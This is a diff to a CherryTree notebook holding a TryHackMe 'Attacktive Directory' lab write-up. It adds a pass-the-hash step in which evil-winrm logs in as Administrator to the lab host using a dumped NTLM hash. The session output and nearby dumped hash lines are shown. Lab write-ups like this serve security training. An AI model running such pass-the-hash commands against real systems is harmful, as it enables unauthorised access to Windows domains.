@@ -508,6 +508,21 @@ ATTACKTIVEDIREC$:des-cbc-md5:b686b94c1aa1a2f7
 </codebox>
       <codebox char_offset="99" justification="left" frame_width="39" frame_height="53" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</codebox>
     </node>
-    <node name="Pass the Hash Attack" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673216338" ts_lastsave="1673216338"/>
+    <node name="Pass the Hash Attack" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1673216338" ts_lastsave="1673217855">
+      <rich_text>use the has in order to connect to the Admin console using the following:
+
+</rich_text>
+      <codebox char_offset="75" justification="left" frame_width="39" frame_height="53" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~/…/repos/Writeups/TryHackMe/AttacktiveDirectory]
+└─$ evil-winrm -i 10.10.138.97 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                   
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+</codebox>
+    </node>
   </node>
 </cherrytree>
